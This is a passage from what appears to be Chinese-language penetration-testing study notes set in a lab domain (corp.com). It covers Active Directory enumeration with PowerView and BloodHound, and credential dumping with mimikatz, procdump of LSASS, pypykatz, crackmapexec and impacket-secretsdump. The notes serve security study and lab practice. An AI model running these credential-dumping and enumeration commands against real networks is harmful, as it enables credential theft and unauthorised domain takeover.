</span></span><span class="line"><span class="cl">			listen 127.0.0.1:4455 172.16.2.11:445 <span class="c1">### 类似ssh本地转发</span>
</span></span><span class="line"><span class="cl">		
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="msf-msfmd"><a href="#msf-msfmd" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>MSF ../../../msf.md</h2>
<p>[[msf]]</p>
<h2 id="ad"><a href="#ad" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>AD</h2>
<p>[[AD theoretical]]</p>
<h3 id="枚举"><a href="#枚举" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>枚举</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">------</span>
</span></span><span class="line"><span class="cl"><span class="c">## 手动</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 系统管理员经常通过组策略首选项（GPP）更改本地工作站密码</span>
</span></span><span class="line"><span class="cl">		<span class="n">kali</span><span class="p">&gt;</span><span class="nb">gpp-decrypt</span> <span class="s2">&#34;+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ps</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl">		<span class="n">net</span> <span class="n">accounts</span>   <span class="n">账户策略</span>
</span></span><span class="line"><span class="cl">		<span class="n">net</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl">		<span class="n">net</span> <span class="nb">group </span><span class="p">/</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl">		<span class="n">net</span> <span class="nb">group </span><span class="s1">&#39;xxx&#39;</span> <span class="p">/</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl">		<span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;Management Department&#34;</span> <span class="n">stephanie</span> <span class="p">/</span><span class="n">add</span> <span class="p">/</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl">		<span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;Management Department&#34;</span> <span class="n">stephanie</span> <span class="p">/</span><span class="nb">del </span><span class="p">/</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 获取特定的LDAP ADsPath来与AD服务进行通信</span>
</span></span><span class="line"><span class="cl">		<span class="n">LDAP</span><span class="err">:</span><span class="p">//</span><span class="n">HostName</span><span class="p">[</span><span class="err">:</span><span class="n">PortNumber</span><span class="p">][/</span><span class="n">DistinguishedName</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 函数脚本+使用 查询组 成员属性</span>
</span></span><span class="line"><span class="cl">		<span class="n">LDAPSearch</span> <span class="no">[[AD theoretical]]</span> 
</span></span><span class="line"><span class="cl">	<span class="c">### spn枚举用户和特定服务</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Get-NetUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span>
</span></span><span class="line"><span class="cl">			<span class="n">或</span><span class="err">：</span><span class="n">setspn</span> <span class="n">-L</span> <span class="n">iis_service</span>
</span></span><span class="line"><span class="cl">			<span class="n">nslookup</span><span class="p">.</span><span class="n">exe</span> <span class="n">web04</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c">## powerview</span>
</span></span><span class="line"><span class="cl">		<span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">		<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="nb">powershell-empire</span><span class="p">/</span><span class="n">empire</span><span class="p">/</span><span class="n">server</span><span class="p">/</span><span class="n">data</span><span class="p">/</span><span class="n">module_source</span><span class="p">/</span><span class="n">situational_awareness</span><span class="p">/</span><span class="n">network</span><span class="p">/</span><span class="n">powerview</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">		<span class="c">### sid转名称</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Convert-SidToName</span> <span class="n">xxxx</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 获取域的基本信息</span>
</span></span><span class="line"><span class="cl">			<span class="nb">get-netdoamin</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 枚举对象上的所有属性 + 筛选cn 域用户 域用户组</span>
</span></span><span class="line"><span class="cl">			<span class="nb">get-netuser</span> <span class="err">｜</span> <span class="nb">select </span><span class="n">cn</span><span class="p">,</span><span class="n">pwdlastset</span><span class="p">,</span><span class="n">lastlogon</span>
</span></span><span class="line"><span class="cl">			<span class="nb">get-netgroup</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 筛选属性</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Get-netgroup</span> <span class="s2">&#34;Sales Department&#34;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">member</span>
</span></span><span class="line"><span class="cl">		<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">		<span class="c">## 枚举操作系统</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 所有计算机对象 机器名</span>
</span></span><span class="line"><span class="cl">			<span class="nb">get-netcomputer</span> 
</span></span><span class="line"><span class="cl">			<span class="nb">get-netcomputer</span> <span class="p">|</span><span class="nb">select </span><span class="n">cn</span><span class="p">,</span><span class="n">distinguishedname</span>
</span></span><span class="line"><span class="cl">			<span class="c">## 根据某个属性的值筛选</span>
</span></span><span class="line"><span class="cl">			<span class="nb">get-netcomputer</span> <span class="p">|</span>  <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">cn</span> <span class="o">-like</span> <span class="s1">&#39;files04&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">		<span class="c">### 当前帐号在其他机器上有管理员权限主机</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Find-LocalAdminAccess</span>
</span></span><span class="line"><span class="cl">		<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">		<span class="c">## 已登录账户</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 目标主机上有哪些用户登录 依赖于注册表              HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\，很大几率会查询失败。</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="n">files04</span> <span class="n">-Verbose</span>
</span></span><span class="line"><span class="cl">			<span class="c">### 查看权限</span>
</span></span><span class="line"><span class="cl">				<span class="nb">Get-Acl</span> <span class="n">-Path</span> <span class="n">HKLM</span><span class="err">:</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">LanmanServer</span><span class="p">\</span><span class="n">DefaultSecurity</span><span class="p">\</span> <span class="p">|</span> <span class="nb">fl
</span></span></span><span class="line"><span class="cl"><span class="nb"></span>				
</span></span><span class="line"><span class="cl">		<span class="c">### 目标主机上有哪些用户登录  必须开启Remote Registry服务</span>
</span></span><span class="line"><span class="cl">			<span class="p">.\</span><span class="n">PsLoggedon</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\</span><span class="n">files04</span>
</span></span><span class="line"><span class="cl">		<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">		<span class="c">## 使用spn枚举</span>
</span></span><span class="line"><span class="cl">		<span class="c">### spn枚举用户和特定服务</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Get-NetUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span>
</span></span><span class="line"><span class="cl">			<span class="n">或</span><span class="err">：</span><span class="n">setspn</span> <span class="n">-L</span> <span class="n">iis_service</span>
</span></span><span class="line"><span class="cl">			<span class="n">nslookup</span><span class="p">.</span><span class="n">exe</span> <span class="n">web04</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> 
</span></span><span class="line"><span class="cl">		<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">		<span class="c">## 枚举对象权限</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 对象的ACEs枚举 关注ActiveDirectoryRights，SecurityIdentifier </span>
</span></span><span class="line"><span class="cl">			<span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="n">stephanie</span>
</span></span><span class="line"><span class="cl">		<span class="c">### sid转名字</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Convert-SidToName</span> <span class="n">xxx</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 查找特定组内的ActiveDirectoryRights为GenericAll权限的用户的sid</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&#34;Management Department&#34;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-eq</span> <span class="s2">&#34;GenericAll&#34;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SecurityIdentifier</span><span class="p">,</span><span class="n">ActiveDirectoryRights</span>
</span></span><span class="line"><span class="cl">		<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">		<span class="c">## 枚举域共享</span>
</span></span><span class="line"><span class="cl">			<span class="c">### SYSVOL默认映射到dc的 \\dc1.corp.com\sysvol\corp.com\</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Find-DomainShare</span>
</span></span><span class="line"><span class="cl">			<span class="c">### 默认共享查询 也可以用非默认共享查询的格式</span>
</span></span><span class="line"><span class="cl">			<span class="nb">ls </span><span class="p">\\</span><span class="n">dc1</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">\</span><span class="n">sysvol</span><span class="p">\</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">\</span>
</span></span><span class="line"><span class="cl">			<span class="nb">cat </span><span class="p">\\</span><span class="n">dc1</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">\</span><span class="n">sysvol</span><span class="p">\</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">oldpolicy</span><span class="p">\</span><span class="nb">old-policy</span><span class="n">-backup</span><span class="p">.</span><span class="n">xml</span>
</span></span><span class="line"><span class="cl">			<span class="c">### 非默认共享查询 </span>
</span></span><span class="line"><span class="cl">			<span class="nb">ls </span><span class="p">\\</span><span class="n">FILES04</span><span class="p">\</span><span class="n">docshare</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl"><span class="p">------</span>
</span></span><span class="line"><span class="cl"><span class="c">## 自动 SharpHound BloodHound   /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1</span>
</span></span><span class="line"><span class="cl">	<span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Sharphound</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">	<span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="n">-OutputDirectory</span> <span class="n">C:</span><span class="p">\</span><span class="n">temp</span> <span class="n">-OutputPrefix</span> <span class="s2">&#34;medtech&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="n">kali</span><span class="p">&gt;</span> <span class="n">neo4j</span> <span class="nb">start </span>
</span></span><span class="line"><span class="cl">		  <span class="n">bloodhound</span>
</span></span><span class="line"><span class="cl">			<span class="n">MATCH</span> <span class="p">(</span><span class="n">m:Computer</span><span class="p">)</span> <span class="k">RETURN</span> <span class="n">m</span> 
</span></span><span class="line"><span class="cl">			<span class="n">MATCH</span> <span class="p">(</span><span class="n">m:User</span><span class="p">)</span> <span class="k">RETURN</span> <span class="n">m</span>
</span></span><span class="line"><span class="cl">			<span class="c">### 用户在哪些主机有session</span>
</span></span><span class="line"><span class="cl">			<span class="n">MATCH</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">c:Computer</span><span class="p">)-[</span><span class="err">:</span><span class="n">HasSession</span><span class="p">]-&gt;(</span><span class="n">m:User</span><span class="p">)</span> <span class="k">RETURN</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">			<span class="c">### 枚举winrm user</span>
</span></span><span class="line"><span class="cl">			<span class="n">MATCH</span> <span class="n">p1</span><span class="p">=</span><span class="n">shortestPath</span><span class="p">((</span><span class="n">u1</span><span class="err">:</span><span class="n">User</span><span class="p">)-[</span><span class="n">r1</span><span class="err">:</span><span class="n">MemberOf</span><span class="p">*</span><span class="n">1</span><span class="p">..]-&gt;(</span><span class="n">g1</span><span class="err">:</span><span class="n">Group</span><span class="p">))</span> <span class="n">MATCH</span> <span class="n">p2</span><span class="p">=(</span><span class="n">u1</span><span class="p">)-[</span><span class="err">:</span><span class="n">CanPSRemote</span><span class="p">*</span><span class="n">1</span><span class="p">..]-&gt;(</span><span class="n">c:Computer</span><span class="p">)</span> <span class="k">RETURN</span> <span class="n">p2</span>
</span></span><span class="line"><span class="cl">			<span class="c">### 枚举sql权限</span>
</span></span><span class="line"><span class="cl">			<span class="n">MATCH</span> <span class="n">p1</span><span class="p">=</span><span class="n">shortestPath</span><span class="p">((</span><span class="n">u1</span><span class="err">:</span><span class="n">User</span><span class="p">)-[</span><span class="n">r1</span><span class="err">:</span><span class="n">MemberOf</span><span class="p">*</span><span class="n">1</span><span class="p">..]-&gt;(</span><span class="n">g1</span><span class="err">:</span><span class="n">Group</span><span class="p">))</span> <span class="n">MATCH</span> <span class="n">p2</span><span class="p">=(</span><span class="n">u1</span><span class="p">)-[</span><span class="err">:</span><span class="n">SQLAdmin</span><span class="p">*</span><span class="n">1</span><span class="p">..]-&gt;(</span><span class="n">c:Computer</span><span class="p">)</span> <span class="k">RETURN</span> <span class="n">p2</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="active-directory身份验证和攻击"><a href="#active-directory身份验证和攻击" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Active Directory身份验证和攻击</h3>
<p>mimikatz mimikatz..exe</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## mimikatz</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 快捷</span>
</span></span><span class="line"><span class="cl">		<span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;token::elevate&#34;</span> <span class="s2">&#34;sekurlsa::logonPasswords full&#34;</span> <span class="s2">&#34;exit&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;token::elevate&#34;</span> <span class="s2">&#34;lsadump::lsa /patch&#34;</span> <span class="s2">&#34;exit&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="c">### powershell注入内存</span>
</span></span><span class="line"><span class="cl">		<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">ad</span><span class="p">/</span><span class="n">Tools</span><span class="p">/</span><span class="n">PSTools</span><span class="p">/</span><span class="nb">Invoke-ReflectivePEInjection</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c">### 直接转储Lsass</span>
</span></span><span class="line"><span class="cl">		<span class="n">条件</span><span class="err">：</span><span class="n">需要SEDebugPrivilege权限</span><span class="err">，</span><span class="n">本地管理员默认有此权限</span>
</span></span><span class="line"><span class="cl">		<span class="n">任务管理器-Lsass</span><span class="p">-</span><span class="n">右键-dump</span> <span class="n">fie</span> 
</span></span><span class="line"><span class="cl">		<span class="n">kali</span><span class="err">:</span> <span class="n">pypykatz</span> <span class="n">lsa</span> <span class="n">minidump</span> <span class="n">xxx</span><span class="p">.</span><span class="n">DMP</span>
</span></span><span class="line"><span class="cl">			  <span class="n">或crackmapexec</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">76</span> <span class="n">-u</span> <span class="n">testadmin</span> <span class="n">-p</span> <span class="n">Password123</span> <span class="p">-</span><span class="n">-lsa</span>  <span class="n">会存到</span><span class="p">~/.</span><span class="n">cme</span><span class="p">/</span><span class="n">logs</span><span class="p">/</span> <span class="c">#破解密码</span>
</span></span><span class="line"><span class="cl">			  <span class="n">或crackmapexec</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">76</span> <span class="n">-u</span> <span class="n">testadmin</span> <span class="n">-p</span> <span class="n">Password123</span> <span class="n">-M</span> <span class="n">lsassy</span>
</span></span><span class="line"><span class="cl">			  <span class="n">或</span> <span class="n">新机器上可启用WDigest</span><span class="err">，</span><span class="n">但一般情况不需要</span>
</span></span><span class="line"><span class="cl">		<span class="n">或win</span><span class="err">:</span> <span class="n">procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-accepteula</span> <span class="n">-ma</span> <span class="s2">&#34;lsass.exe&#34;</span> <span class="n">out</span><span class="p">.</span><span class="n">dmp</span>
</span></span><span class="line"><span class="cl">			   <span class="n">或tasklist</span> <span class="p">|</span> <span class="n">findstr</span> <span class="n">lsass</span> <span class="p">&amp;&amp;</span> <span class="n">procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-accepteula</span> <span class="n">-ma</span> <span class="n">580</span> <span class="n">out</span><span class="p">.</span><span class="n">dmp</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="c">### dump SAM SYSTEM</span>
</span></span><span class="line"><span class="cl">		<span class="nb">impacket-secretsdump</span> <span class="n">-system</span> <span class="p">./</span><span class="n">SYSTEM</span> <span class="n">-sam</span> <span class="p">./</span><span class="n">SAM</span> <span class="n">LOCAL</span>
</span></span><span class="line"><span class="cl"><span class="c">## exe use </span>
</span></span><span class="line"><span class="cl">	<span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>	<span class="c">###开启SeDebugPrivilege访问权限</span>
</span></span><span class="line"><span class="cl">	<span class="n">token</span><span class="p">::</span><span class="n">elevate</span> 		<span class="c">###提升至system权限</span>
</span></span><span class="line"><span class="cl">	<span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span>		<span class="c">###提取SAM中的NTLM哈希</span>
</span></span><span class="line"><span class="cl">	<span class="n">lsadump</span><span class="p">::</span><span class="n">cache</span>         <span class="c">###和cme的--lsa一样,cme的可以破解</span>
</span></span><span class="line"><span class="cl">	<span class="n">lsadump</span><span class="p">::</span><span class="n">secrets</span>
</span></span><span class="line"><span class="cl">	<span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">patch</span> <span class="c">###导出krbtgt的NTLM和域SID 和管理和域用户的has</span>
